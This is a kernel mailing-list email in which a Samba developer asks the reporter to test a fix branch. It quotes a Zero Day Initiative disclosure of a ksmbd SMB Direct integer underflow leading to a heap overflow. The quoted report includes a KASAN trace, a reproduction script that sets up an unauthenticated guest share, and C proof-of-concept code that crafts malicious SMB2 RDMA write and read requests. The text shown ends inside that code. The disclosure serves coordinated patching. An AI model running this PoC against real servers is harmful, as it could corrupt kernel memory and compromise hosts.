Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=144.76.82.148
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792621007;
	b=wxM/5T/fGRkI9Ea9QXT+NNCfeVmDXSGrZWchZmTkxvHciPPOM00HlEviyIUn6rmg3ibh
	 jlus1hTaRkRBReBnosD3aMrL+9aMkKxXnSQNO+89ONfX2QyzMrdsMIIQmZdU1ui8mPLOe
	 RUQFrZaP7wXvX5pGjG++1c4VGU2nt2oyESDdzuJV+esHrTYSNzUmfSSQVAK0Oq/yBblh3
	 2mjEFx+X5Lf8+RMe28InHdXoF1gy3m+8JLygCvTfDclVnWr1INB0bY5hysUDvtU1LWSqX
	 RswB8S6ybtvsScZHOHK6t+HYKp4yqgOPew/mL4AFXs1E+aBqXL/KzhtIEnbLhCmzVmw==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792621007;
	h=DMARC-Filter:DKIM-Signature:Received:Message-ID:Date:MIME-Version:
	 User-Agent:Subject:To:Cc:References:Content-Language:From:In-Reply-To:
	 Content-Type:Content-Transfer-Encoding;
	bh=PeHAt7ONHDFHAqJNlfq50ocUUmoaokw7je51lyADvg0=;
	b=aYFLwacFWBYMNy3Dg+MatpimxeTy/CCODoGz2jTpuN6dTyzlvVu56hKMJUYqKwb3CveS
	 pL8Cu+04lLR9OeXUgYR/4iDPIzWCG2Ib16/2UxWZcQTjGGKqc1ERLmtwo14AJBFJCJIOk
	 9RbBhORkPY4MsBB8X22fgh4UZB48t5LkHcWjXW5nvn137dMqTDDs8qhFPJMVcxf7kfO/C
	 0kQ/f6MS7+ytTaEijatNOT3JD+tDvnuDxckkG3tjoK0w47BYju/YPs7Qch5hY9SxK+GvX
	 nQ11jKTWlKta7TDqhv3KVZogAHMBx8hi72wvB6L+NH8S47IV2YIIMC9mTMzmWZ6V1+Q==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=samba.org;
	spf=pass smtp.mailfrom=samba.org;
	dkim=pass header.d=samba.org header.i=@samba.org header.a=rsa-sha256 header.s=42 header.b=waVSpsDZ;
	arc=none smtp.remote-ip=144.76.82.148
Received: from hr2.samba.org (hr2.samba.org [144.76.82.148])
	(using TLSv1.3 with cipher TLS_CHACHA20_POLY1305_SHA256 (256/256 bits)
	 key-exchange ECDHE (prime256v1) server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id F1AB3606A31A;
	Wed, 21 Oct 2026 22:16:44 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org F1AB3606A31A
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=samba.org
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=samba.org
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (3072-bit key, unprotected) header.d=samba.org header.i=@samba.org header.a=rsa-sha256 header.s=42 header.b=waVSpsDZ
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=samba.org;
	s=42; h=From:Cc:To:Date:Message-ID;
	bh=PeHAt7ONHDFHAqJNlfq50ocUUmoaokw7je51lyADvg0=; b=waVSpsDZhjj6d9Idei6Xb4vBXQ
	QM1r4mq2DhaD1084UBnGeAESUGL4O4Soi/wnjVve3vkWaYXjyBfsTiTcvZqLaxM3n7DhM1lFBYDbi
	V0LQyhv0Lmxgzq1nX444MxwCeTaPWZhnssJGnV+O+mw5V50xPJVtiuWOiXO8h9X7HZ3wn2WfJ5wz5
	7wyIjonxGeLfTiO4Ow+20kAFAzTaD+6SWURItXabHo06IV2lSoiaSq7Spd7AHf5QxFTMfC6ukbZdM
	PYeHCPDhGeTP6MbwfGHOcG5movFh4rUotM7FTne7fPa/73mCruK4HIajsHpMFC0rT20maDgwKexBi
	wHpjL1OoUZlk+wxGTdpUZsdjCuqLiztbjshVMisVyv8vRWrJdkKJYPKrM+XGHDz4qG/8fBAG8RZ/R
	5DRZUMbLGCvPn/M3j6fnQSS45VouEzyNIY/9bQzJCgJ+wbA9ZR4MuNcDGw9JY7+5QUSPV93lvqhay
	Rr1Xkp8udRdMYC4XCp4RQC1N;
Received: from [127.0.0.2] (localhost [127.0.0.1])
	by hr2.samba.org with esmtpsa (TLS1.3:ECDHE_SECP256R1__ECDSA_SECP256R1_SHA256__CHACHA20_POLY1305:256)
	(Exim)
	id 1xJebs-00000004C9n-2jDi;
	Wed, 21 Oct 2026 22:16:36 +0000
Message-ID: <bd43bd47-688e-45ba-9fd3-e32da2bb691a@samba.org>
Date: Thu, 22 Oct 2026 00:16:35 +0200
X-Mailing-List: linux-cifs@vger.kernel.org
List-Id: <linux-cifs.vger.kernel.org>
List-Post: <mailto:linux-cifs@vger.kernel.org>
List-Help: <mailto:linux-cifs+help@vger.kernel.org>
List-Subscribe: <mailto:linux-cifs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-cifs+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-cifs+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: ZDI-CAN-33549: New Vulnerability Report
To: "zdi-disclosures@trendmicro.com" <zdi-disclosures@trendmicro.com>,
 "security@kernel.org" <security@kernel.org>
Cc: Namjae Jeon <linkinjeon@kernel.org>, Paulo Alcantara <pc@manguebit.org>,
 Tom Talpey <tom@talpey.com>,
 "open list:SMBDIRECT (RDMA Stream Transport with Read/Writ..."
 <linux-cifs@vger.kernel.org>,
 "moderated list:SMBDIRECT (RDMA Stream Transport with Read/Writ..."
 <samba-technical@lists.samba.org>, open list <linux-kernel@vger.kernel.org>
References: <BYAPR01MB3830472B5702C089B0BBB77D80662@BYAPR01MB3830.prod.exchangelabs.com>
Content-Language: en-US
From: Stefan Metzmacher <metze@samba.org>
In-Reply-To: <BYAPR01MB3830472B5702C089B0BBB77D80662@BYAPR01MB3830.prod.exchangelabs.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit

Hi HYEONTAE LEE,

would you be able to test if this is reproducable on this branch:
https://git.samba.org/?p=metze/linux/wip.git;a=shortlog;h=refs/heads/for-7.5/smbdirect
git clone -b for-7.5/smbdirect  https://git.samba.org/metze/linux/wip.git for-7.5-smbdirect

I guess it's already fixed with that.

Thanks!
metze

Am 21.10.26 um 23:16 schrieb zdi-disclosures@trendmicro.com:
> ZDI-CAN-33549: Linux Kernel KSMBD SMB Direct Integer Underflow Remote Code Execution Vulnerability
> 
> -- CVSS -----------------------------------------
> 
> 9.0: AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H
> 
> -- ABSTRACT -------------------------------------
> 
> Trend Micro's Zero Day Initiative has identified a vulnerability affecting the following products:
> Linux - Kernel KSMBD
> 
> -- VULNERABILITY DETAILS ------------------------
> * Version Tested:7.3-rc3
> * Platform Tested:debian trixie
> 
> ---
> 
> ### Analysis
> 
> integer underflow in smbdirect_connection_rdma_xmit()
> The reproduce kernel built with CONFIG_SMB_SERVER_SMBDIRECT=y + CONFIG_RDMA_RXE=y
> Here is the target requirement
> 1) RDMA device
> 2) writable share
> 3) smb direct (ubuntu only)
> 
> ~~~C++
> int smbdirect_connection_rdma_xmit(struct smbdirect_socket *sc,
> 				   void *buf, size_t buf_len,
> 				   struct smbdirect_buffer_descriptor_v1 *desc,
> 				   size_t desc_len,
> 				   bool is_read)
> {
> ...
> 	for (i = 0; i < desc_len / sizeof(*desc); i++) {
> 		if (!buf_len)
> 			break;
> 
> 		desc_buf_len = le32_to_cpu(desc[i].length);
> 		if (!desc_buf_len)
> 			return -EINVAL;
> 
> 		if (desc_buf_len > buf_len) {
> 			desc_buf_len = buf_len;
> 			desc[i].length = cpu_to_le32(desc_buf_len);
> 			buf_len = 0;											// (1)
> 		}
> 
> 		credits_needed += smbdirect_connection_calc_rw_credits(sc,
> 								       desc_buf,
> 								       desc_buf_len);
> 		desc_buf += desc_buf_len;
> 		buf_len -= desc_buf_len;									// (2) integer underflow, and leads to heap overflow within rxe_mr_copy()
> 		desc_num++;
> 	}
> 
> ~~~
> 
> KASAN report
> ```
> BUG: KASAN: slab-out-of-bounds in rxe_mr_copy_dma /root/linux/drivers/infiniband/sw/rxe/rxe_mr.c:372
> BUG: KASAN: slab-out-of-bounds in rxe_mr_copy+0x3a2/0x600 /root/linux/drivers/infiniband/sw/rxe/rxe_mr.c:396
> Write of size 1024 at addr ffff888023a610a8 by task kworker/u19:1/49
> 
> CPU: 2 UID: 0 PID: 49 Comm: kworker/u19:1 Not tainted 7.3.0-rc3 #4 PREEMPT(lazy)
> Hardware name: QEMU Ubuntu 25.10 PC v2 (i440FX + PIIX, + 10.1 machine, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> Workqueue: rxe_wq do_work
> Call Trace:
>   <TASK>
>   __dump_stack /root/linux/lib/dump_stack.c:94
>   dump_stack_lvl+0x100/0x190 /root/linux/lib/dump_stack.c:120
>   print_address_description /root/linux/mm/kasan/report.c:378
>   print_report+0x139/0x4ad /root/linux/mm/kasan/report.c:482
>   kasan_report+0xe4/0x1d0 /root/linux/mm/kasan/report.c:595
>   check_region_inline /root/linux/mm/kasan/generic.c:186
>   kasan_check_range+0x125/0x200 /root/linux/mm/kasan/generic.c:200
>   __asan_memcpy+0x3c/0x60 /root/linux/mm/kasan/shadow.c:106
>   rxe_mr_copy_dma /root/linux/drivers/infiniband/sw/rxe/rxe_mr.c:372
>   rxe_mr_copy+0x3a2/0x600 /root/linux/drivers/infiniband/sw/rxe/rxe_mr.c:396
>   copy_data+0x393/0x680 /root/linux/drivers/infiniband/sw/rxe/rxe_mr.c:481
>   do_read /root/linux/drivers/infiniband/sw/rxe/rxe_comp.c:363
>   rxe_completer+0x195c/0x41d0 /root/linux/drivers/infiniband/sw/rxe/rxe_comp.c:702
>   rxe_sender+0x20/0x60 /root/linux/drivers/infiniband/sw/rxe/rxe_req.c:860
>   do_task /root/linux/drivers/infiniband/sw/rxe/rxe_task.c:127
>   do_work+0x19a/0x770 /root/linux/drivers/infiniband/sw/rxe/rxe_task.c:191
>   process_one_work+0xaf7/0x1b30 /root/linux/kernel/workqueue.c:3396
>   process_scheduled_works /root/linux/kernel/workqueue.c:3479
>   worker_thread+0x5eb/0xe50 /root/linux/kernel/workqueue.c:3560
>   kthread+0x373/0x450 /root/linux/kernel/kthread.c:436
>   ret_from_fork+0x72b/0xd30 /root/linux/arch/x86/kernel/process.c:158
>   ret_from_fork_asm+0x1a/0x30 /root/linux/arch/x86/entry/entry_64.S:245
>   </TASK>
> 
> Allocated by task 30:
>   kasan_save_stack+0x30/0x50 /root/linux/mm/kasan/common.c:57
>   kasan_save_track+0x14/0x30 /root/linux/mm/kasan/common.c:78
>   poison_kmalloc_redzone /root/linux/mm/kasan/common.c:398
>   __kasan_kmalloc+0x9a/0xb0 /root/linux/mm/kasan/common.c:415
>   kasan_kmalloc /root/linux/./include/linux/kasan.h:263
>   __do_kmalloc_node /root/linux/mm/slub.c:5414
>   __kvmalloc_node_noprof+0x352/0x9a0 /root/linux/mm/slub.c:7014
>   smb2_write+0x1dce/0x30d0
>   __process_request /root/linux/fs/smb/server/server.c:160
>   __handle_ksmbd_work /root/linux/fs/smb/server/server.c:277
>   handle_ksmbd_work+0x61a/0x1ff0 /root/linux/fs/smb/server/server.c:368
>   process_one_work+0xaf7/0x1b30 /root/linux/kernel/workqueue.c:3396
>   process_scheduled_works /root/linux/kernel/workqueue.c:3479
>   worker_thread+0x5eb/0xe50 /root/linux/kernel/workqueue.c:3560
>   kthread+0x373/0x450 /root/linux/kernel/kthread.c:436
>   ret_from_fork+0x72b/0xd30 /root/linux/arch/x86/kernel/process.c:158
>   ret_from_fork_asm+0x1a/0x30 /root/linux/arch/x86/entry/entry_64.S:245
> 
> The buggy address belongs to the object at ffff888023a610a0
>   which belongs to the cache kmalloc-8 of size 8
> The buggy address is located 0 bytes to the right of
>   allocated 8-byte region [ffff888023a610a0, ffff888023a610a8)
> 
> The buggy address belongs to the physical page:
> page: refcount:0 mapcount:0 mapping:0000000000000000 index:0xffff888023a61400 pfn:0x23a61
> flags: 0xfff00000000200(workingset|node=0|zone=1|lastcpupid=0x7ff)
> page_type: f5(slab)
> raw: 00fff00000000200 ffff88801c442500 ffffea00009adb50 ffff88801c440348
> raw: ffff888023a61400 0000000000800020 00000000f5000000 0000000000000000
> page dumped because: kasan: bad access detected
> page_owner tracks the page as allocated
> page last allocated via order 0, migratetype Unmovable, gfp_mask 0xd2cc0(GFP_KERNEL|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 9639, tgid 9639 ((les-load)), ts 57473223994
>   set_page_owner /root/linux/./include/linux/page_owner.h:33
>   post_alloc_hook+0xfe/0x140 /root/linux/mm/page_alloc.c:1871
>   prep_new_page /root/linux/mm/page_alloc.c:1879
>   get_page_from_freelist+0x10c7/0x34d0 /root/linux/mm/page_alloc.c:3943
>   __alloc_frozen_pages_noprof+0x2de/0x3190 /root/linux/mm/page_alloc.c:5436
>   alloc_slab_page /root/linux/mm/slub.c:3347
>   allocate_slab /root/linux/mm/slub.c:3462
>   new_slab+0xa7/0x6b0 /root/linux/mm/slub.c:3513
>   refill_objects+0xeb/0x400 /root/linux/mm/slub.c:7417
>   refill_sheaf /root/linux/mm/slub.c:2885
>   __pcs_replace_empty_main+0x370/0x670 /root/linux/mm/slub.c:4774
>   alloc_from_pcs /root/linux/mm/slub.c:4850
>   slab_alloc_node /root/linux/mm/slub.c:4984
>   __do_kmalloc_node /root/linux/mm/slub.c:5413
>   __kmalloc_noprof+0x668/0x830 /root/linux/mm/slub.c:5439
>   _kmalloc_noprof /root/linux/./include/linux/slab.h:995
>   kernfs_fop_write_iter+0x26a/0x5f0 /root/linux/fs/kernfs/file.c:322
>   new_sync_write /root/linux/fs/read_write.c:595
>   vfs_write+0x69a/0xfd0 /root/linux/fs/read_write.c:687
>   ksys_write+0x12a/0x250 /root/linux/fs/read_write.c:739
>   do_syscall_x64 /root/linux/arch/x86/entry/syscall_64.c:61
>   do_syscall_64+0x125/0x780 /root/linux/arch/x86/entry/syscall_64.c:84
>   entry_SYSCALL_64_after_hwframe+0x77/0x7f /root/linux/arch/x86/entry/entry_64.S:121
> page last free pid 9603 tgid 9603 ts 56955377107 stack trace:
>   reset_page_owner /root/linux/./include/linux/page_owner.h:26
>   __free_pages_prepare /root/linux/mm/page_alloc.c:1418
>   __free_frozen_pages+0x793/0x1140 /root/linux/mm/page_alloc.c:2962
>   __pagetable_free /root/linux/./include/linux/mm.h:3804
>   pagetable_free /root/linux/./include/linux/mm.h:3828
>   pagetable_dtor_free /root/linux/./include/linux/mm.h:3927
>   __tlb_remove_table /root/linux/./include/asm-generic/tlb.h:221
>   __tlb_remove_table_free /root/linux/mm/mmu_gather.c:228
>   tlb_remove_table_rcu+0x2cf/0x380 /root/linux/mm/mmu_gather.c:291
>   rcu_do_batch /root/linux/kernel/rcu/tree.c:2650
>   rcu_core+0x5f6/0x1250 /root/linux/kernel/rcu/tree.c:2919
>   handle_softirqs+0x1e0/0x9d0 /root/linux/kernel/softirq.c:645
>   __do_softirq /root/linux/kernel/softirq.c:679
>   invoke_softirq /root/linux/kernel/softirq.c:519
>   __irq_exit_rcu+0x182/0x250 /root/linux/kernel/softirq.c:758
>   irq_exit_rcu+0x9/0x30 /root/linux/kernel/softirq.c:775
>   instr_sysvec_apic_timer_interrupt /root/linux/arch/x86/kernel/apic/apic.c:1062
>   sysvec_apic_timer_interrupt+0xa3/0xc0 /root/linux/arch/x86/kernel/apic/apic.c:1062
>   asm_sysvec_apic_timer_interrupt+0x1a/0x20 /root/linux/./arch/x86/include/asm/idtentry.h:674
> 
> Memory state around the buggy address:
>   ffff888023a60f80: fa fb fb fb fc fc fc fc fa fb fb fb fc fc fc fc
>   ffff888023a61000: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
>> ffff888023a61080: fc fc fc fc 00 fc fc fc 05 fc fc fc 06 fc fc fc
>                                    ^
>   ffff888023a61100: 01 fc fc fc fa fc fc fc fa fc fc fc fa fc fc fc
>   ffff888023a61180: fa fc fc fc fa fc fc fc fa fc fc fc 04 fc fc fc
> ==================================================================
> ```
> 
> ---
> 
> ## Reproduction script (reproduce.sh)
> 
> ```bash
> #!/bin/bash
> # Minimal reproduction: ksmbd SMB Direct RDMA descriptor-length integer underflow
> # in fs/smb/smbdirect/rw.c smbdirect_connection_rdma_xmit().
> #
> # Trigger: SMB2 WRITE with RemainingBytes=8 and two RDMA buffer descriptors:
> #   desc[0].length=4096 -> exceeds payload, clamp at rw.c:143 sets buf_len=0
> #     (rw.c:146), then rw.c:153 does buf_len -= 4096, wrapping size_t;
> #   desc[1].length=8192 -> now passes the clamp unclamped -> 8 KB OOB write.
> # Expected: BUG: KASAN: slab-out-of-bounds in rxe_mr_copy, write past an
> # 8-byte kmalloc region allocated by smb2_write <- handle_ksmbd_work.
> #
> # Preconditions already baked into the VM this script drives:
> #   - kernel with CONFIG_SMB_SERVER_SMBDIRECT=y, CONFIG_RDMA_RXE=y,
> #     CONFIG_KASAN=y (bzImage at /root/linux/arch/x86/boot/bzImage)
> #   - guest PoC binary /root/s3rig, VM launcher /root/image/run-vm.sh
> set -x
> 
> SSH="ssh -i /root/image/trixie.id_rsa -p 10021 -o StrictHostKeyChecking=no root@127.0.0.1"
> 
> # 1. Boot the VM if needed, wait for SSH
> $SSH true 2>/dev/null || (cd /root/image && nohup ./run-vm.sh >/dev/null 2>&1 &)
> until $SSH true 2>/dev/null; do sleep 10; done
> 
> # 2. Guest setup: ksmbd guest share + soft-RoCE link + victim file.
> #    Every config line is load-bearing:
> #      map to guest = bad user -> PoC logs in with bogus user, no password
> #      read only = no          -> the trigger is an SMB2 WRITE
> #      guest ok = yes          -> guest access to the share
> #      path = /tmp             -> world-traversable dir (guest = nobody);
> #                                 /root is 0700 and would deny the CREATE
> $SSH 'bash -s' <<'EOF'
> printf '[global]\n\tmap to guest = bad user\n\n[share]\n\tpath = /tmp\n\tread only = no\n\tguest ok = yes\n' > /etc/ksmbd/ksmbd.conf
> systemctl restart ksmbd
> sleep 1
> rdma link add rxe0 type rxe netdev eth0 2>/dev/null
> printf 'VICTIM FILE CONTENT - pad to 8 bytes' > /tmp/victim.bin
> chmod 666 /tmp/victim.bin
> sysctl -w kernel.panic_on_warn=0 >/dev/null
> EOF
> 
> # 3. Control run: single descriptor == payload, no clamp, benign write ok
> $SSH "cd /root && timeout 20 ./s3rig -h 10.0.2.15 -s '\\\\10.0.2.15\\share' -f victim.bin -m control"
> 
> # 4. Trigger run (dirA). The guest may crash from the heap corruption right
> #    after; the PoC prints TRIGGER/RUN-COMPLETE first.
> $SSH "cd /root && timeout 20 ./s3rig -h 10.0.2.15 -s '\\\\10.0.2.15\\share' -f victim.bin -m dirA" | tee poc-dirA-stdout.log
> 
> # 5. KASAN report from the serial console log
> grep -a -m1 -A60 'BUG: KASAN' /root/image/vm.log > kasan-report-dirA.txt
> head -2 kasan-report-dirA.txt
> ```
> 
> ## PoC source (poc/s3rig.c)
> 
> ```c
> // SPDX-License-Identifier: GPL-2.0
> /*
>   * s3rig - SMB Direct client for reproducing the ksmbd buf_len underflow.
>   *
>   * Does rdma_cm connect, SMB Direct negotiate, SMB2 NEGOTIATE / SESSION_SETUP
>   * (raw NTLMSSP, guest) / TREE_CONNECT / CREATE, then sends one crafted
>   * RDMA-channel WRITE or READ.
>   *
>   * Use port 445, not 5445: transport_rdma.c:391 limits 5445 to iWARP devices
>   * and rxe reports RDMA_NODE_IB_CA, which only the 445 listener takes.
>   *
>   * Mode "control" does a plain single-descriptor RDMA write first, so a silent
>   * kernel log can be told apart from an RDMA path that never ran.
>   *
>   * Exit codes: 0 all selected stages ran, 1 a stage failed (see the last
>   * S3RIG: line), 2 bad usage. Exit 0 says nothing about whether the kernel
>   * tripped; only dmesg does.
>   */
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <stdint.h>
> #include <stddef.h>
> #include <errno.h>
> #include <unistd.h>
> #include <time.h>
> #include <netdb.h>
> #include <arpa/inet.h>
> #include <sys/socket.h>
> #include <rdma/rdma_cma.h>
> #include <infiniband/verbs.h>
> 
> /* ------------------------------------------------------------------ tunables */
> 
> #define SMBD_PORT_DEFAULT  "445"      /* RoCE/IB listener; 5445 is iWARP-only  */
> #define SMBD_MAX_SEND      1364u
> #define SMBD_MAX_RECV      8192u
> #define SMBD_MAX_FRAG      1048576u
> #define NRECV              8
> #define ATTACKER_MR_SIZE   (1u << 20)
> 
> /* direction A (write) defaults */
> #define TRIG_BUFLEN        8u         /* RemainingBytes -> kvzalloc(8)         */
> #define TRIG_DESC0_LEN     4096u      /* > buflen  => rw.c:143 clamps          */
> #define TRIG_DESC1_LEN     8192u      /* taken unclamped at data_buf + buflen  */
> 
> #define PACKED __attribute__((packed))
> 
> /* ------------------------------------------------------------- wire structs  */
> 
> /* fs/smb/smbdirect/pdu.h:16 */
> struct smbd_negotiate_req {
> 	uint16_t min_version, max_version, reserved, credits_requested;
> 	uint32_t preferred_send_size, max_receive_size, max_fragmented_size;
> } PACKED;
> 
> /* fs/smb/smbdirect/pdu.h:27 */
> struct smbd_negotiate_resp {
> 	uint16_t min_version, max_version, negotiated_version, reserved;
> 	uint16_t credits_requested, credits_granted;
> 	uint32_t status, max_readwrite_size, preferred_send_size;
> 	uint32_t max_receive_size, max_fragmented_size;
> } PACKED;
> 
> /* fs/smb/smbdirect/pdu.h:47 */
> struct smbd_data_transfer {
> 	uint16_t credits_requested, credits_granted, flags, reserved;
> 	uint32_t remaining_data_length, data_offset, data_length, padding;
> } PACKED;
> #define SMBD_DATA_OFFSET 0x18         /* pdu.h:42 SMBDIRECT_DATA_OFFSET        */
> 
> /* include/linux/smbdirect.h:12 */
> struct smbd_bdesc_v1 {
> 	uint64_t offset;
> 	uint32_t token;
> 	uint32_t length;
> } PACKED;
> 
> /* fs/smb/common/smb2pdu.h, SMB2 header, 64 bytes */
> struct smb2_hdr_w {
> 	uint32_t ProtocolId;
> 	uint16_t StructureSize;
> 	uint16_t CreditCharge;
> 	uint32_t Status;
> 	uint16_t Command;
> 	uint16_t CreditRequest;
> 	uint32_t Flags;
> 	uint32_t NextCommand;
> 	uint64_t MessageId;
> 	uint32_t Reserved;
> 	uint32_t TreeId;
> 	uint64_t SessionId;
> 	uint8_t  Signature[16];
> } PACKED;
> 
> struct smb2_write_req_w {
> 	struct smb2_hdr_w hdr;
> 	uint16_t StructureSize;             /* 0x40, must be 49 */
> 	uint16_t DataOffset;                /* 0x42 */
> 	uint32_t Length;                    /* 0x44 */
> 	uint64_t Offset;                    /* 0x48 */
> 	uint64_t PersistentFileId;          /* 0x50 */
> 	uint64_t VolatileFileId;            /* 0x58 */
> 	uint32_t Channel;                   /* 0x60 */
> 	uint32_t RemainingBytes;            /* 0x64 */
> 	uint16_t WriteChannelInfoOffset;    /* 0x68 */
> 	uint16_t WriteChannelInfoLength;    /* 0x6a */
> 	uint32_t Flags;                     /* 0x6c */
> } PACKED;                                   /* Buffer[] at 0x70 */
> 
> struct smb2_read_req_w {
> 	struct smb2_hdr_w hdr;
> 	uint16_t StructureSize;             /* 0x40, must be 49 */
> 	uint8_t  Padding;                   /* 0x42 */
> 	uint8_t  Flags;                     /* 0x43 */
> 	uint32_t Length;                    /* 0x44 */
> 	uint64_t Offset;                    /* 0x48 */
> 	uint64_t PersistentFileId;          /* 0x50 */
> 	uint64_t VolatileFileId;            /* 0x58 */
> 	uint32_t MinimumCount;              /* 0x60 */
> 	uint32_t Channel;                   /* 0x64 */
> 	uint32_t RemainingBytes;            /* 0x68 */
> 	uint16_t ReadChannelInfoOffset;     /* 0x6c */
> 	uint16_t ReadChannelInfoLength;     /* 0x6e */
> } PACKED;                                   /* Buffer[] at 0x70 */
> 
> #define SMB2_NEGOTIATE_CMD          0x0000
> #define SMB2_SESSION_SETUP_CMD      0x0001
> #define SMB2_TREE_CONNECT_CMD       0x0003
> #define SMB2_CREATE_CMD             0x0005
> #define SMB2_READ_CMD               0x0008
> #define SMB2_WRITE_CMD              0x0009
> #define SMB2_CHANNEL_RDMA_V1        0x00000001
> 
> #define SMB2_WRITE_BUFFER_OFF       0x70   /* offsetof(smb2_write_req, Buffer) */
> #define SMB2_READ_BUFFER_OFF        0x70   /* offsetof(smb2_read_req,  Buffer) */
> #define SMB2_SESS_BUFFER_OFF        0x58   /* offsetof(smb2_sess_setup_req, Buffer) */
> #define SMB2_TCON_BUFFER_OFF        0x48   /* offsetof(smb2_tree_connect_req, Buffer) */
> #define SMB2_CREATE_BUFFER_OFF      0x78   /* offsetof(smb2_create_req, Buffer) */
> 
> #define STATUS_SUCCESS                    0x00000000u
> #define STATUS_MORE_PROCESSING_REQUIRED   0xC0000016u
> 
> /* --------------------------------------------------------------- parameters  */
> 
> struct trig_params {
> 	uint64_t persistent_fid, volatile_fid, session_id, message_id;
> 	uint32_t tree_id;
> 	uint64_t mr_addr;
> 	uint32_t mr_rkey;
> 	uint32_t buflen, desc0_len, desc1_len;
> };
> 
> static void put_hdr(struct smb2_hdr_w *h, uint16_t cmd, const struct trig_params *p)
> {
> 	memset(h, 0, sizeof(*h));
> 	h->ProtocolId    = 0x424d53fe;     /* 0xFE 'S' 'M' 'B' */
> 	h->StructureSize = 64;
> 	h->CreditCharge  = 1;
> 	h->Command       = cmd;
> 	h->CreditRequest = 64;
> 	h->MessageId     = p->message_id;
> 	h->TreeId        = p->tree_id;
> 	h->SessionId     = p->session_id;
> }
> 
> /* --------------------------------------------------------------- triggers */
> 
> /*
>   * Write direction. The path through the server:
>   *   smb2pdu.c:7677  Channel == SMB2_CHANNEL_RDMA_V1
>   *   smb2pdu.c:7685  length = RemainingBytes
>   *   smb2pdu.c:7691  wants Length == 0 && DataOffset == 0 && ch_offset >= 0x70
>   *   smb2pdu.c:7288  ch_count = 32/16 = 2; only zero is rejected, and the
>   *                   ch_count != 1 reject went away in ee1b05589659
>   *   smb2pdu.c:7605  data_buf = kvzalloc(RemainingBytes)
>   *   rw.c:143        desc[0].length > buf_len, so the clamp fires
>   *   rw.c:146/153    buf_len = 0 then buf_len -= 4096, wrapping to ~SIZE_MAX
>   *   rw.c:143        desc[1].length can no longer exceed buf_len
>   *   rw.c:152        desc_buf walks past the end of data_buf
>   */
> static size_t build_write_trigger(uint8_t *out, size_t outsz,
> 				  const struct trig_params *p, int ndesc)
> {
> 	struct smb2_write_req_w *w = (struct smb2_write_req_w *)out;
> 	struct smbd_bdesc_v1 *desc;
> 	size_t total = SMB2_WRITE_BUFFER_OFF + (size_t)ndesc * sizeof(*desc);
> 
> 	if (outsz < total)
> 		return 0;
> 	memset(out, 0, total);
> 
> 	put_hdr(&w->hdr, SMB2_WRITE_CMD, p);
> 	w->StructureSize          = 49;
> 	w->DataOffset             = 0;                     /* smb2pdu.c:7691 */
> 	w->Length                 = 0;                     /* smb2pdu.c:7691 */
> 	w->Offset                 = 0;
> 	w->PersistentFileId       = p->persistent_fid;
> 	w->VolatileFileId         = p->volatile_fid;
> 	w->Channel                = SMB2_CHANNEL_RDMA_V1;  /* smb2pdu.c:7677 */
> 	w->RemainingBytes         = p->buflen;             /* smb2pdu.c:7605 */
> 	w->WriteChannelInfoOffset = SMB2_WRITE_BUFFER_OFF; /* smb2pdu.c:7692 */
> 	w->WriteChannelInfoLength = (uint16_t)(ndesc * sizeof(*desc));
> 	w->Flags                  = 0;
> 
> 	desc = (struct smbd_bdesc_v1 *)(out + SMB2_WRITE_BUFFER_OFF);
> 
> 	/* larger than RemainingBytes, so rw.c:143 clamps */
> 	desc[0].offset = p->mr_addr;
> 	desc[0].token  = p->mr_rkey;
> 	desc[0].length = p->desc0_len;
> 
> 	if (ndesc > 1) {
> 		/* taken as-is after the wrap; lands at data_buf + RemainingBytes */
> 		desc[1].offset = p->mr_addr;
> 		desc[1].token  = p->mr_rkey;
> 		desc[1].length = p->desc1_len;
> 	}
> 	return total;
> }
> 
> /*
>   * Read direction. The buffer is sized ALIGN(Length, 8) at smb2pdu.c:7428 but
>   * the sink gets nbytes, so Length has to match the file size for the overrun
>   * to start right at the object end.
>   */
> static size_t build_read_trigger(uint8_t *out, size_t outsz,
> 				 const struct trig_params *p, uint32_t length)
> {
> 	struct smb2_read_req_w *r = (struct smb2_read_req_w *)out;
> 	struct smbd_bdesc_v1 *desc;
> 	size_t total = SMB2_READ_BUFFER_OFF + 2 * sizeof(*desc);
> 
> 	if (outsz < total)
> 		return 0;
> 	memset(out, 0, total);
> 
> 	put_hdr(&r->hdr, SMB2_READ_CMD, p);
> 	r->StructureSize         = 49;
> 	r->Length                = length;
> 	r->Offset                = 0;
> 	r->PersistentFileId      = p->persistent_fid;
> 	r->VolatileFileId        = p->volatile_fid;
> 	r->MinimumCount          = 0;
> 	r->Channel               = SMB2_CHANNEL_RDMA_V1;
> 	r->RemainingBytes        = 0;
> 	r->ReadChannelInfoOffset = SMB2_READ_BUFFER_OFF;
> 	r->ReadChannelInfoLength = 2 * sizeof(*desc);
> 
> 	desc = (struct smbd_bdesc_v1 *)(out + SMB2_READ_BUFFER_OFF);
> 	desc[0].offset = p->mr_addr;
> 	desc[0].token  = p->mr_rkey;
> 	desc[0].length = p->desc0_len;
> 	desc[1].offset = p->mr_addr + p->desc0_len;
> 	desc[1].token  = p->mr_rkey;
> 	desc[1].length = p->desc1_len;
